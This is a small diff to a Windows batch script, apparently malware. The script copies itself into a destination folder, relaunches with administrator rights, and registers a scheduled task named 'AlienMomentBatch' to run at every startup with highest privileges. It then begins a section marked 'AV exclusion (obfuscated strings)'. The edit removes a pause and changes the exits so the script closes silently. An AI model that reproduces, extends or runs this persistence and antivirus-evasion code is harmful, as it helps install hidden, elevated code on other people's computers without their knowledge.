@@ -11,7 +11,7 @@ if /I not "%~f0"=="%destPath%" (
     if not exist "%destFolder%" mkdir "%destFolder%"
     copy /Y "%~f0" "%destPath%"
     powershell -Command "Start-Process -FilePath '%destPath%' -Verb RunAs"
-    exit /b
+    exit
 )
 
 rem Running from Program Files now with admin (add elevation check if needed)
@@ -34,8 +34,7 @@ powershell.exe -Command "Start-Process powershell -ArgumentList '-ExecutionPolic
 
 schtasks /create /tn "AlienMomentBatch" /tr "\"%destPath%\"" /sc ONSTART /rl HIGHEST /f
 
-pause
-exit /b
+exit
 
 ::PSCRIPT
 # AV exclusion (obfuscated strings)
